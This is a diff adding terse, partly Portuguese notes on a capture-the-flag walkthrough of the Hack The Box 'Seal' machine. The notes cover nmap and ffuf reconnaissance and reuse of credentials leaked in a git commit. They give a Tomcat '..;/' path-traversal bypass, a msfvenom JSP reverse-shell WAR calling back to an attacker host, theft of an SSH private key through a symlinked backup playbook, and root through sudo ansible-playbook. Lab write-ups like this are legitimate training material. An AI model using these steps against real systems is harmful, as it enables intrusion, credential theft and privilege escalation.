@@ -1,0 +1,205 @@
+nmap -sV -sC 10.10.10.250 -p- -Pn
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 01:41 EDT
+Nmap scan report for 10.10.10.250
+Host is up (0.12s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
+|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
+|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
+443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Seal Market
+| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
+| Not valid before: 2021-05-05T10:24:03
+|_Not valid after:  2022-05-05T10:24:03
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 401 Unauthorized
+|     Date: Thu, 23 Sep 2021 06:00:15 GMT
+|     Set-Cookie: JSESSIONID=node03ogczk02qd641dzz5tte2z0b82.node0; Path=/; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 0
+|   GetRequest: 
+|     HTTP/1.1 401 Unauthorized
+|     Date: Thu, 23 Sep 2021 06:00:14 GMT
+|     Set-Cookie: JSESSIONID=node0vodueabboq881b0gcr3h9o5gw0.node0; Path=/; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Thu, 23 Sep 2021 06:00:14 GMT
+|     Set-Cookie: JSESSIONID=node01vjn29z6vfbvf1jklilxfs3qpa1.node0; Path=/; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html;charset=utf-8
+|     Allow: GET,HEAD,POST,OPTIONS
+|     Content-Length: 0
+|   RPCCheck: 
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
+|   RTSPRequest: 
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
+|   Socks4: 
+|     HTTP/1.1 400 Illegal character CNTL=0x4
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
+|   Socks5: 
+|     HTTP/1.1 400 Illegal character CNTL=0x5
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.91%I=7%D=9/23%Time=614C17CD%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Thu,\x2023\x2
+SF:0Sep\x202021\x2006:00:14\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0vodue
+SF:abboq881b0gcr3h9o5gw0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu
+SF:,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html
+SF:;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,109,"HTT
+SF:P/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2023\x20Sep\x202021\x2006:00:14\x
+SF:20GMT\r\nSet-Cookie:\x20JSESSIONID=node01vjn29z6vfbvf1jklilxfs3qpa1\.no
+SF:de0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2
+SF:000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\
+SF:x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
+SF:t,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/h
+SF:tml;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close
+SF:\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Versio
+SF:n</pre>")%r(FourOhFourRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nD
+SF:ate:\x20Thu,\x2023\x20Sep\x202021\x2006:00:15\x20GMT\r\nSet-Cookie:\x20
+SF:JSESSIONID=node03ogczk02qd641dzz5tte2z0b82\.node0;\x20Path=/;\x20HttpOn
+SF:ly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nConte
+SF:nt-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r
+SF:(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nCon
+SF:tent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\n
+SF:Connection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\
+SF:x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x204
+SF:00\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;ch
+SF:arset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r
+SF:\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x2
+SF:0CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20charact
+SF:er\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
+SF:ntent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
+SF:20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1117.81 seconds
+
+
+ffuf -c -u https://10.10.10.250:443/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .html,.php,.txt -c
+
+http://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7
+
+luis:42MrHBf*z8{Z%
+
+https://10.10.10.250/manager/status
+
+tomcat:42MrHBf*z8{Z%
+
+https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
+
+https://10.10.10.250/manager/status/..;/html
+
+https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat
+
+ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.66 LPORT=4444 -f war -o rce.war  
+
+Usar o burp para mudar o diretorio para aonde a shell sera upada
+
+Intercepitar a requisição e alterar o caminho
+
+/manager/jmxproxy/..;/html/upload 
+
+
+/opt/backups/playbook/run.yml
+
+cat run.yml
+- hosts: localhost
+  tasks:
+  - name: Copy Files
+    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
+  - name: Server Backups
+    archive:
+      path: /opt/backups/files/
+      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
+  - name: Clean
+    file:
+      state: absent
+      path: /opt/backups/files/
+
+
+Na linha 4 do codigo ele copia arquivos da maquina para um diretorio
+
+Entao criamos uma symblink para a id rsa do Luis
+
+ln -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads 
+
+A pasta uploads é uma pasta que temos todas as permissões
+
+Depois do usar esse comando na pasta /opt/backups vamos para o diretorio /tmp
+
+Em seguida vemos se nosso backup foi criado
+
+ls -la /opt/backup/archives
+
+Copiamos ele para a pasta tmp
+
+cp /opt/backup/archives "backup-file" glrn.gz
+
+Depois damos unzip nesse arquivo gzip -kd glrn.gz
+
+tar -xf glrn
+
+Vemos que apareceu uma pasta chamada "dashboard" (a mesma que tem em /var/lib/tomcat9/webapps/ROOT/admin/) a diferença que nessa tem um diretorio escondido ".ssh"
+
+ls -la
+ls -la
+total 0
+drwxr-x--- 3 tomcat tomcat  60 Nov  6 22:21 .
+drwxr-x--- 7 tomcat tomcat 160 May  7  2021 ..
+drwx------ 2 tomcat tomcat 100 May  7  2021 .ssh
+
+Nela esta a id rsa kye do Luis
+
+Salvamos ela em nossa maquina
+
+chmod 600 id_rsa
+
+ssh -i id_rsa luis@seal.htb
+
+sudo -l
+Matching Defaults entries for luis on seal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User luis may run the following commands on seal:
+    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
+
+
+https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo
+
+Quando executar os comandos viraremos root
